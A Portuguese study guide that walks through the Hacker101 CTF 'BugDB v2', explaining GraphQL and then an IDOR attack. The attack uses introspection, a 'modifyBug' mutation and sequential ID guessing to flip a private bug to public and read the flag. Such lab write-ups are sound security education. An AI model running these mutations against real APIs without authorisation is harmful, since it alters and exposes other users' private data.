# Guia de Resolução: Hacker101 CTF - BugDB v2

Este documento é um guia de estudo aprofundado para o desafio "BugDB v2". Ele detalha a cadeia de vulnerabilidades que leva à resolução do CTF, com foco na evolução do ataque em relação à versão anterior e na exploração de mutações em APIs GraphQL. O objetivo é explicar não apenas *como* resolver, mas fornecer uma compreensão sólida do *porquê* cada passo funciona.

### Pré-requisito 1: O que é GraphQL? (A Analogia do Restaurante)

Antes de mergulharmos na vulnerabilidade, é crucial entender o que é GraphQL e como ele difere de uma API tradicional (REST).

**O Restaurante Tradicional (API REST)**

Imagine que você vai a um restaurante com um menu de pratos fixos:
*   **Prato 1:** Bife com Batatas Fritas (`/users`)
*   **Prato 2:** Salada de Frango (`/posts`)

Se você quer apenas o bife, você tem que pedir o "Prato 1" e receberá o bife **e** as batatas fritas, mesmo que não as queira. Se você quer o bife e a salada, precisa fazer dois pedidos separados. Você recebe exatamente o que está no menu, nem mais, nem menos.

**O Restaurante Moderno (API GraphQL)**

Agora, imagine um restaurante diferente. Não há um menu fixo. Em vez disso, há um buffet com um chef muito inteligente. Você vai até o chef com um único pedido e diz exatamente o que quer:

> "Eu gostaria de um bife, duas colheres de purê de batatas, uma folha de alface e o molho da salada de frango."

O chef entende seu pedido, monta seu prato personalizado e te entrega tudo de uma vez. Você recebe **exatamente** o que pediu, nem mais, nem menos, em uma única viagem.

Isso é o **GraphQL**. O cliente tem total controle para pedir os dados que precisa, e o servidor responde com um JSON que espelha perfeitamente a estrutura do pedido.

### Pré-requisito 2: Como Escrever uma Query e uma Mutation em GraphQL (A Receita do Bolo)

Entender como "fazer o pedido" ao chef do GraphQL é fundamental. Uma operação tem quatro componentes principais, como uma receita.

**1. A Operação (O Tipo de Receita)**
Primeiro, você diz o que quer fazer.
*   Para ler dados, usa-se `query`.
*   Para modificar dados (criar, atualizar, deletar), usa-se `mutation`.
*   **Exemplo:** `mutation { ... }`

**2. O Campo Raiz (O Prato Principal)**
Logo após abrir as chaves, você escolhe o ponto de partida. No nosso CTF, descobrimos que existiam a query `allBugs` e a mutação `modifyBug`.
*   **Como saber quais existem?** Através da **Introspecção**, que é como pedir o menu completo ao chef.
*   **Exemplo:** `mutation { modifyBug }`

**3. A Seleção de Campos (Os Acompanhamentos)**
Este é o superpoder do GraphQL. Para cada operação, você especifica exatamente quais campos quer de volta como resposta. Você faz isso usando outro par de chaves `{}`.
*   **Exemplo:** Queremos saber se a modificação do bug foi bem-sucedida (`ok`).
    ```graphql
    mutation {
      modifyBug {
        ok # <- Nosso acompanhamento de retorno
      }
    }
    ```

**4. Os Argumentos (O "Modo de Preparo")**
Para modificar um objeto específico, você precisa dizer qual. Você passa argumentos dentro de parênteses `()` logo após o nome do campo.
*   **Exemplo:** `mutation { modifyBug(id: 1, private: false) }`

**Juntando Tudo (Exemplo Completo):**
Vamos montar a mutação que usamos no desafio.

```graphql
# 1. Operação de modificação
mutation {
  # 2. Campo raiz 'modifyBug', com argumentos para especificar o alvo e a ação
  modifyBug(id: 2, private: false) {
    # 3. Seleção de campos para a resposta
    ok
    bug {
      id
      text
    }
  }
}
```
Com esta base, você está pronto para entender exatamente o que fizemos no desafio.

---

## Vulnerabilidade: Controle de Acesso Quebrado via Mutação (IDOR)

Este CTF evolui do seu predecessor. Enquanto o BugDB v1 explorava uma falha de leitura, o v2 se concentra em uma falha de **escrita**. A vulnerabilidade central continua sendo **Controle de Acesso Quebrado**, mas o vetor de ataque mudou de uma `query` para uma `mutation`.

### 1. Dica do Desafio
<details>
  <summary>Clique para revelar a dica</summary>
  <p><i>What has changed since last version? (O que mudou desde a última versão?)</i></p>
</details>

### 2. Explicação Didática

> Imagine um quadro de avisos público em um condomínio. Qualquer morador pode afixar um cartaz. Ao lado, há uma vitrine de vidro trancada, onde apenas o síndico pode colocar "Anúncios Oficiais". Você, um morador, não consegue ler o que está dentro da vitrine.
>
> Você percebe que o zelador (a API) aceita pedidos para mover anúncios. Você vai até ele e diz: "Por favor, pegue o anúncio número 2 da vitrine trancada e coloque-o no quadro de avisos público". O zelador, sem verificar se você é o síndico, obedece. Ele abre a vitrine, pega o anúncio secreto e o afixa para que todos possam ver.

A exploração se deu em três fases:
1.  **Reconhecimento:** Descobrimos a existência da vitrine (`Bugs` privados) e a função do zelador (`modifyBug`) através da Introspecção.
2.  **Teste da Hipótese:** Tentamos mover um anúncio que já era público e o zelador obedeceu, confirmando que ele não pedia credenciais.
3.  **Exploração:** Pedimos para ele mover um anúncio específico da vitrine trancada para o quadro público, revelando a informação secreta.

### 3. Explicação Técnica Aprofundada: A Anatomia do Ataque

O ataque foi uma progressão lógica, construída sobre a base do que não funcionou.

#### **Fase 1: Obtendo o Mapa com a Introspecção**

Assim como na v1, o ponto de partida foi uma **Introspection Query**. A API, por estar com essa funcionalidade habilitada em produção, nos entregou seu esquema completo.

**Análise do Esquema (O Mapa):**
Ao analisar o resultado da introspecção, notamos:
*   Uma query `allBugs` para listar bugs.
*   Um tipo `Bugs` com um campo booleano `private`.
*   Uma mutação `modifyBug(id: Int, private: Boolean, text: String)`. Esta era a grande novidade em relação à v1.

**Primeira Tentativa: Listar Tudo**
O primeiro passo lógico foi tentar listar todos os bugs, esperando que um bug privado vazasse.

```graphql
query GetAllBugs {
  allBugs {
    id
    text
    private
  }
}
```

**Resultado:** A API retornou apenas um bug público. Isso mostrou que a proteção na listagem (`allBugs`) estava funcionando corretamente. Precisávamos de outro vetor.

---

#### **Fase 2: Testando a Mutação (IDOR)**

A dica do CTF nos diz para focar no que mudou. A mudança foi a mutação `modifyBug`. A hipótese era: "Se eu não posso ler bugs privados, será que posso modificá-los?".

**Construindo o Payload de Teste:**
Primeiro, testamos a vulnerabilidade em um objeto que sabíamos existir: o bug com `id: 1`.

```graphql
mutation {
  modifyBug(id: 1, text: "Este bug foi alterado") {
    ok
    bug {
      id
    }
  }
}
```

**Analisando o Resultado do Teste:**
A API respondeu com:
```json
{
  "data": {
    "modifyBug": {
      "ok": true,
      "bug": null
    }
  }
}
```
Este resultado foi a **confirmação da vulnerabilidade**:
*   `"ok": true`: A operação de escrita foi um sucesso. O servidor não negou a modificação.
*   `"bug": null`: Ao tentar ler os dados do bug modificado para nos retornar, a regra de acesso foi aplicada, e como não éramos donos do bug, recebemos `null`.

Isso provou a falha de **IDOR (Insecure Direct Object Reference)**: a lógica de negócio permitia a escrita, mas não a leitura, sem verificar a propriedade do objeto.

---

#### **Fase 3: Exploração por Brute-Force**

Agora que tínhamos a arma, só precisávamos encontrar o alvo certo. O objetivo era encontrar um bug privado e torná-lo público. Como não sabíamos o ID, tentamos em sequência.

**Construindo o Payload de Exploração:**
Tentamos modificar o bug com `id: 2`, especificamente para mudar seu status de privacidade.

```graphql
mutation {
  modifyBug(id: 2, private: false) {
    ok
  }
}
```

**Por que este payload funcionou?**
Executamos a mutação para `id: 2`. A API, vulnerável ao IDOR, aceitou o comando e alterou o campo `private` do bug `2` para `false`, sem verificar se tínhamos permissão.

**A Revelação Final:**
Imediatamente após a mutação, executamos a query `allBugs` novamente.

```graphql
query {
  allBugs {
    id
    text
    private
  }
}
```
Desta vez, como o bug `2` não era mais privado, ele apareceu na lista, revelando a flag em seu campo `text`.

### 4. Ferramentas que Poderiam Ajudar

*   **GraphiQL / GraphQL Playground:** Essenciais para explorar manualmente a API, testar queries e mutações.
*   **GraphQL Voyager:** Uma ferramenta de visualização que desenha um mapa interativo da API a partir da introspecção, facilitando a identificação de queries e mutações interessantes.
*   **Burp Suite (com a extensão GraphQL Raider):** Permite interceptar, analisar e modificar requisições GraphQL, além de automatizar ataques como o brute-force de IDs.